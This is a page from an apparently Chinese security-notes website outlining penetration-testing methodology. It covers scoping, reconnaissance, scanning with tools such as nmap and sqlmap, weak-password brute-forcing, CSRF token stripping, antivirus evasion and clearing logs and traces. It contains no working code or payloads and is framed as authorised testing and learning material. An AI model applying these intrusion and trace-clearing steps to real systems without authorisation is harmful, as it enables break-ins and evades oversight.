@@ -1,0 +1,2478 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.2.3, mkdocs-material-8.1.8">
+    
+    
+      
+        <title>渗透流程归纳 - klsfct Docs</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.6e60f8b8.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.e6a45f82.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#000000">
+        
+      
+    
+    
+    
+      
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../js/stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="black" data-md-color-accent="deep-orange">
+  
+    
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#_1" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../.." title="klsfct Docs" class="md-header__button md-logo" aria-label="klsfct Docs" data-md-component="logo">
+      
+  <img src="../../images/logo.jpg" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            klsfct Docs
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              渗透流程归纳
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+        <button type="reset" class="md-search__icon md-icon" aria-label="清空当前内容" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+
+
+  <li class="md-tabs__item">
+    <a href="../.." class="md-tabs__link">
+      主页
+    </a>
+  </li>
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../%E5%AE%89%E5%85%A8wiki/%E7%9B%AE%E5%BD%95/" class="md-tabs__link">
+        安全wiki
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/" class="md-tabs__link">
+        红队
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../blueteam/%E8%93%9D%E9%98%9F%E7%9B%AE%E5%BD%95/" class="md-tabs__link">
+        蓝队
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/" class="md-tabs__link">
+        挖洞相关
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../about/aboutme/" class="md-tabs__link">
+        About
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="klsfct Docs" class="md-nav__button md-logo" aria-label="klsfct Docs" data-md-component="logo">
+      
+  <img src="../../images/logo.jpg" alt="logo">
+
+    </a>
+    klsfct Docs
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        主页
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" data-md-state="indeterminate" type="checkbox" id="__nav_2" checked>
+      
+      
+      
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      
+      
+        <label class="md-nav__link" for="__nav_2">
+          安全wiki
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="安全wiki" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          安全wiki
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%AE%89%E5%85%A8wiki/%E7%9B%AE%E5%BD%95/" class="md-nav__link">
+        目录
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" class="md-nav__link">
+        安全基础
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%AE%89%E5%85%A8wiki/Web%E5%AE%89%E5%85%A8/" class="md-nav__link">
+        web安全
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%AE%89%E5%85%A8wiki/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8/" class="md-nav__link">
+        数据安全
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%AE%89%E5%85%A8wiki/CMS%E5%AE%89%E5%85%A8/" class="md-nav__link">
+        cms安全
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%AE%89%E5%85%A8wiki/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" class="md-nav__link">
+        流量分析
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%AE%89%E5%85%A8wiki/%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8/" class="md-nav__link">
+        服务器、中间件安全
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%AE%89%E5%85%A8wiki/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" class="md-nav__link">
+        应急响应
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%AE%89%E5%85%A8wiki/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="md-nav__link">
+        渗透测试
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" data-md-state="indeterminate" type="checkbox" id="__nav_3" checked>
+      
+      
+      
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      
+      
+        <label class="md-nav__link" for="__nav_3">
+          红队
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="红队" data-md-level="1">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          红队
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/" class="md-nav__link">
+        目录
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="md-nav__link">
+        信息收集
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E6%BC%8F%E6%B4%9E%E5%BA%93/" class="md-nav__link">
+        漏洞库
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/" class="md-nav__link">
+        溯源分析
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E9%92%93%E9%B1%BC/" class="md-nav__link">
+        钓鱼
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" data-md-state="indeterminate" type="checkbox" id="__nav_4" checked>
+      
+      
+      
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      
+      
+        <label class="md-nav__link" for="__nav_4">
+          蓝队
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="蓝队" data-md-level="1">
+        <label class="md-nav__title" for="__nav_4">
+          <span class="md-nav__icon md-icon"></span>
+          蓝队
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../blueteam/%E8%93%9D%E9%98%9F%E7%9B%AE%E5%BD%95/" class="md-nav__link">
+        目录
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" class="md-nav__link">
+        应急响应
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../blueteam/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/" class="md-nav__link">
+        日志分析
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../blueteam/window实战.md" class="md-nav__link">
+        window实战
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../linux实战.md" class="md-nav__link">
+        linux实战
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../web实战.md" class="md-nav__link">
+        web实战
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_5" data-md-state="indeterminate" type="checkbox" id="__nav_5" checked>
+      
+      
+      
+        
+          
+        
+          
+        
+      
+      
+        <label class="md-nav__link" for="__nav_5">
+          挖洞相关
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="挖洞相关" data-md-level="1">
+        <label class="md-nav__title" for="__nav_5">
+          <span class="md-nav__icon md-icon"></span>
+          挖洞相关
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/" class="md-nav__link">
+        众测项目
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/" class="md-nav__link">
+        思路方法
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6" data-md-state="indeterminate" type="checkbox" id="__nav_6" checked>
+      
+      
+      
+        
+          
+        
+      
+      
+        <label class="md-nav__link" for="__nav_6">
+          About
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="About" data-md-level="1">
+        <label class="md-nav__title" for="__nav_6">
+          <span class="md-nav__icon md-icon"></span>
+          About
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../about/aboutme/" class="md-nav__link">
+        about me
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    #记录一下渗透测试中的一些知识点
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0x01" class="md-nav__link">
+    0x01 信息收集
+  </a>
+  
+    <nav class="md-nav" aria-label="0x01 信息收集">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1" class="md-nav__link">
+    1. 目标确认**
+  </a>
+  
+    <nav class="md-nav" aria-label="1. 目标确认**">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#11" class="md-nav__link">
+    1.1 域名注册信息**
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#12-dns" class="md-nav__link">
+    1.2 DNS信息查询
+  </a>
+  
+    <nav class="md-nav" aria-label="1.2 DNS信息查询">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#dns" class="md-nav__link">
+    在线DNS信息查询工具
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#13" class="md-nav__link">
+    1.3 测试域传送漏洞
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#14" class="md-nav__link">
+    1.4 业务相关
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-osint" class="md-nav__link">
+    2. OSINT 公开情报收集
+  </a>
+  
+    <nav class="md-nav" aria-label="2. OSINT 公开情报收集">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#21" class="md-nav__link">
+    2.1社会工程学技巧(网络安全攻防：社会工程学之概述)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#22osint" class="md-nav__link">
+    2.2搜索引擎OSINT
+  </a>
+  
+    <nav class="md-nav" aria-label="2.2搜索引擎OSINT">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#google-hackingbaidubingsouhugithub" class="md-nav__link">
+    Google Hacking(baidu\bing\souhu\github)
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#23" class="md-nav__link">
+    2.3浏览器实用插件：
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#24cnvd" class="md-nav__link">
+    2.4乌云和cnvd
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0x02-mapping" class="md-nav__link">
+    0x02 Mapping
+  </a>
+  
+    <nav class="md-nav" aria-label="0x02 Mapping">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1_1" class="md-nav__link">
+    1.主动扫描
+  </a>
+  
+    <nav class="md-nav" aria-label="1.主动扫描">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#11_1" class="md-nav__link">
+    1.1常见服务漏洞:
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#12" class="md-nav__link">
+    1.2常见端口漏洞:
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#13wafbypass" class="md-nav__link">
+    1.3WAF及bypass
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#14_1" class="md-nav__link">
+    1.4****目录、后台和敏感路径文件扫描
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0x03" class="md-nav__link">
+    0x03 漏洞挖掘
+  </a>
+  
+    <nav class="md-nav" aria-label="0x03 漏洞挖掘">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1_2" class="md-nav__link">
+    1.漏洞扫描工具
+  </a>
+  
+    <nav class="md-nav" aria-label="1.漏洞扫描工具">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#11nikto-web" class="md-nav__link">
+    1.1Nikto Web服务漏洞扫描器
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#12awvs" class="md-nav__link">
+    1.2****AWVS漏扫
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#13nessus" class="md-nav__link">
+    1.3NESSUS
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#14xray" class="md-nav__link">
+    1.4Xray自动化
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#15fuzz" class="md-nav__link">
+    1.5Fuzz
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2" class="md-nav__link">
+    2.手动挖掘
+  </a>
+  
+    <nav class="md-nav" aria-label="2.手动挖掘">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#21sql" class="md-nav__link">
+    2.1SQL注入：
+  </a>
+  
+    <nav class="md-nav" aria-label="2.1SQL注入：">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1_3" class="md-nav__link">
+    1#、注入六连：
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2cookie" class="md-nav__link">
+    2#、COOKIE注入：
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3post" class="md-nav__link">
+    3#、POST注入：
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4" class="md-nav__link">
+    4#、常用指令：
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#22xss" class="md-nav__link">
+    2.2XSS跨站脚本攻击：
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#23_1" class="md-nav__link">
+    2.3文件上传
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#24" class="md-nav__link">
+    2.4命令执行
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#25" class="md-nav__link">
+    2.5弱口令及字典破解
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#26" class="md-nav__link">
+    2.6逻辑漏洞
+  </a>
+  
+    <nav class="md-nav" aria-label="2.6逻辑漏洞">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cookie" class="md-nav__link">
+    Cookie
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    验证码绕过
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+                
+
+  <h1>渗透流程归纳</h1>
+
+<p>写在开头：     知识面，决定看到的攻击面有多广。     知识链，决定发动的杀伤链有多深。</p>
+<h2 id="_1">#记录一下<a href="https://so.csdn.net/so/search?q=渗透测试&amp;spm=1001.2101.3001.7020">渗透测试</a>中的一些知识点<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>#渗透测试可以说是模拟黑客入侵的行为，与之不同的是，我们目的是提高系统的安全性，保护系统而进行的测试。</p>
+<p>常规渗透测试基本步骤，主要分为8个步骤：明确目标、信息收集、漏洞探测、漏洞验证、信息分析、获取所需、文档整理、生成报告。流程如下图所示</p>
+<p><img alt="img" src="images/0c4500670c8361bcf7a65d4d12645a73.png" /></p>
+<p>渗透测试基本流程</p>
+<ol>
+<li>明确目标</li>
+</ol>
+<p>确定目标范围、限度、需求等，然后制定渗透测试方案：</p>
+<p>确定范围：测试目标ip、域名、内外网、测试账户、子网、旁站等。</p>
+<p>确定规则：能渗透到什么程度，允许测试的时间段和周期、能否修改上传、提权、查看数据等敏感操作。</p>
+<p>确定需求：web应用服务漏洞、业务逻辑漏洞、人员权限管理漏洞等。</p>
+<ol>
+<li>信息收集、</li>
+</ol>
+<p>利用各种方法获取更多关于目标的信息，利用方式如扫描，开放搜索获取后台页面，未授权页面，敏感URL等：</p>
+<p>基础信息：IP、网段、域名、端口。</p>
+<p>应用信息：各端口的应用。例如web应用、邮件应用、等等。</p>
+<p>系统信息：操作系统和对应版本。</p>
+<p>版本信息：所有探测到的版本，如中间件，系统等。</p>
+<p>服务信息：各种服务开放情况，是否有高危服务等。</p>
+<p>人员信息：域名注册人员信息，web应用用户信息，管理员信息等。</p>
+<p>防护信息：防护设备，如防火墙，安全狗等。</p>
+<ol>
+<li>漏洞探测</li>
+</ol>
+<p>结合信息收集的信息，分析找到漏洞点。</p>
+<p>利用漏扫工具，如awvs、appscan、xray、goby等。</p>
+<p>看历史漏洞及补丁是否修复。</p>
+<p>是否使用含有漏洞的版本。</p>
+<p>安全配置规范，Web应用漏洞等。</p>
+<ol>
+<li>漏洞验证</li>
+</ol>
+<p>将上一步中发现的全部漏洞都验证一遍。结合实际情况，搭建模拟环境进行试验。成功后再应用于目标。</p>
+<ol>
+<li>信息分析</li>
+</ol>
+<p>分析前面的信息为下一步实施渗透做准备。准备好上一步探测到的漏洞利用方法，精准打击目标。</p>
+<p>绕过防御机制。</p>
+<p>定制渗透路径，寻找突破口。</p>
+<p>绕过检测机制、流量监控，杀毒软件，恶意代码检测等（免杀）。</p>
+<ol>
+<li>获取所需</li>
+</ol>
+<p>获取内部信息：基础设施信息（网络架构，VPN，路由，拓扑等）。</p>
+<p>内网：内网入侵，权限维持（一般客户不需要此步骤）。</p>
+<p>清理痕迹：清理相关日志、操作记录、文件等。</p>
+<ol>
+<li>信息整理</li>
+</ol>
+<p>渗透工具：整理渗透过程中用到的代码，poc，exp等。</p>
+<p>收集信息：整理渗透过程中收集到的一切信息。</p>
+<p>漏洞信息：整理渗透过程中遇到的各种漏洞，脆弱位置信息等。</p>
+<ol>
+<li>形成报告</li>
+</ol>
+<p>按照与客户确定的范围、需求整理渗透测试结果形成报告。提供漏洞修复建议和解决方法。</p>
+<p>每个步骤具体内容在网上也有许多规范和大佬姿势，具体情况也是根据实际项目来。一般漏洞扫描到第4步就结束并输出报告了，而渗透测试则是还需要更近一步渗透，利用漏洞获取目标权限，所需信息等，包括绕过一些防御机制，免杀等。甚至有时还需要花费几个星期至几个月，这也是渗透测试花费人力更多，费用更高原因。</p>
+<p>Tips</p>
+<p>拿到ip明确目标后，一般能进行扫描软件扫描，可以先扫描一波</p>
+<p>在扫描的同时我会浏览一下网站的界面功能及结构，利用Wappalyzer等工具查看版本信息等</p>
+<p>因为我待的类似在甲方，并且在内网不用搜索引擎搜索一些敏感信息，这里我直接利用nmap 进行探测，查看端口开放服务和版本，网上搜索版本是否有历史漏洞，如redis未授权漏洞，像22端口开放，可以试试弱口令爆破。nmap的功能有很多，里面也有很多脚本可以直接利用。</p>
+<p>扫描敏感目录，目录扫描工具也很多，不同工具扫描出结果也不同，我用的dirmap和dirb结果也有区别，不能说哪款工具不行，都有特点，这里我们整合一下结果就好了，几款工具一起往往有意外发现。在工具强大之外还需要看字典的，这个需要自己经验不断补充，制作适合自己的字典。</p>
+<p>中间件信息，看看是否是老版本了，含有已知漏洞，补丁是否修复</p>
+<p>注入，浏览页面看参数id，uname，classid等是否存在注入，存在可以丢sqlmap跑，或者看到有这种参数的直接丢sqlmap</p>
+<p>XSS，见框框就插，我测试时，由于是内部开发项目，一般就针对性的测试一下</p>
+<p>CSRF，有token无referer直接删除token；有token和referer，删除referer或值，有验证可以构造referer值，如果响应不报错说明存在，也可以利用burpsuite生成csrf poc来测试</p>
+<p>看看有没有上传处测试一下，一般是白名单我就不测试了，先下一步</p>
+<p>登陆处，爆破，有验证码可以抓包观察验证码是否固定，有迹可寻</p>
+<p>找回密码处，XSS，注入，逻辑漏洞可能存在，抓包多观察</p>
+<p>有账号登陆的情况下，可以测试一下会话固定漏洞，登陆前后cookie值变化，越权漏洞</p>
+<p>URL跳转，有些地址后面会提交到其他页面，多观察地址</p>
+<p>还有就是抓包分析看看js或者浏览器查看，有些js里面可能有意向不到的发现</p>
+<p>这些都是漏洞发现的部分思路，后续还有利用漏洞获取webshell，提权，内网渗透，一般客户要求的渗透测试也不用这么深入，点到为止。</p>
+<p>向那些追击黑产的大佬致敬。
+————————————————
